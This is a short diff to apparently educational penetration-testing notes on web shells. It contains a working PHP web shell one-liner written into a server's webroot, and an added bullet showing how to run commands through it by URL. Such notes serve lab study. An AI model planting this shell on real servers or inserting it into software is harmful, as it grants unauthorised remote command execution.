@@ -44,7 +44,9 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ## Things to know
 - Shell needs to be uploaded for example through a `shell.php` file on the remote host's web directory (webroot)
 - Can check directories for see which webroot is used and use `echo` to write the web shell
-- Once shell is uploaded it can be accessed via browser or through curl
+- Once shell is uploaded it can be accessed via browser or through `curl`
+	- Type `http://SERVER_IP:PORT/shell.php?cmd=id` into url to access shell using the `id` cmd
+	- 
 
 ## Default webroots
 |Web Server|Default Webroot|
